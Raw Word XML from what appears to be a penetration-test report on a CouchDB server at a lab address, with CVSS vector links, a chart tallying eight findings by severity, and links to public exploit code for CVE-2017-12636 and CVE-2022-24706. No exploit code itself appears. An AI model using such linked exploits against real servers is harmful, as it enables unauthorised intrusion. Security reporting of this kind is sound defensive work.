        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1840198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0.10.10.10:5984" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.10.10.10:5984" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X&amp;version=3.0" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.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10.10.10:5984"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uide.couchdb.org/draft/security.html" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X&amp;version=3.0"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chart" Target="charts/chart1.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.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adshade/CVE-2022-24706-CouchDB-Exploit" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X&amp;version=3.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hart" Target="charts/chart2.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.10.10.10:5984"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44786362835387"/>
          <c:y val="0"/>
          <c:w val="0.7579499735677917"/>
          <c:h val="0.90506262666533777"/>
        </c:manualLayout>
      </c:layout>
      <c:doughnutChart>
        <c:varyColors val="1"/>
        <c:ser>
          <c:idx val="0"/>
          <c:order val="0"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$B$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Count</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:dPt>
            <c:idx val="0"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:ln w="19050">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:ln>
              <a:effectLst/>
            </c:spPr>
            <c:extLst>
              <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
                <c16:uniqueId val="{00000001-06E3-4813-B672-65B79CC14212}"/>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2-06E3-4813-B672-65B79CC1421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000-474B-83BC-B2E254F9F042}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$4</c:f>
              <c:strCache>
                <c:ptCount val="3"/>
                <c:pt idx="0">
                  <c:v>Critical</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>High</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Medium</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$B$4</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="3"/>
                <c:pt idx="0">
                  <c:v>1</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>3</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>4</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000000-06E3-4813-B672-65B79CC1421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3.9342255362955917E-3"/>
          <c:y val="0.90506262666533777"/>
          <c:w val="0.98741975274292126"/>
          <c:h val="9.49373733346622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46544084387664"/>
          <c:y val="0.15656642317300698"/>
          <c:w val="0.7448139088581579"/>
          <c:h val="0.57407407407407895"/>
        </c:manualLayout>
      </c:layout>
      <c:barChart>
        <c:barDir val="col"/>
        <c:grouping val="clustered"/>
        <c:varyColors val="0"/>
        <c:ser>
          <c:idx val="0"/>
          <c:order val="0"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$B$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Critical</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="FF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Sheet1!$B$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>1</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000001-C539-4485-AD19-39D2D51AED77}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="1"/>
          <c:order val="1"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$C$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>High</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="FFC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Sheet1!$C$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>3</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000003-C539-4485-AD19-39D2D51AED77}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="2"/>
          <c:order val="2"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$D$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Medium</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c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Number of Vulnerabilities</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$D$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>4</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000005-C539-4485-AD19-39D2D51AED77}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:dLbls>
          <c:dLblPos val="inEnd"/>
          <c:showLegendKey val="0"/>
          <c:showVal val="1"/>
          <c:showCatName val="0"/>
          <c:showSerName val="0"/>
          <c:showPercent val="0"/>
          <c:showBubbleSize val="0"/>
        </c:dLbls>
        <c:gapWidth val="100"/>
        <c:overlap val="-24"/>
        <c:axId val="47510272"/>
        <c:axId val="47511808"/>
      </c:barChart>
      <c:catAx>
        <c:axId val="475102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11808"/>
        <c:crosses val="autoZero"/>
        <c:auto val="1"/>
        <c:lblAlgn val="ctr"/>
        <c:lblOffset val="100"/>
        <c:noMultiLvlLbl val="0"/>
      </c:catAx>
      <c:valAx>
        <c:axId val="4751180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10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z9sXZfiOWKH4nR13ZDbwktpl4w==">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975EA4-61FB-465B-B8BB-479ACBA5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1</Pages>
  <Words>3211</Words>
  <Characters>18855</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>571</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Bansal</dc:creator>
  <cp:lastModifiedBy>Duc Thang</cp:lastModifiedBy>
  <cp:revision>43</cp:revision>
  <cp:lastPrinted>2023-08-20T04:46:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-12-16T20:34:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-08-20T04:46:00Z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9082a53fceea590aa8cef894cd11532c406f8a5f128534a1aead11ff33e8b04d</vt:lpwstr>
  </property>
</Properties>
</file>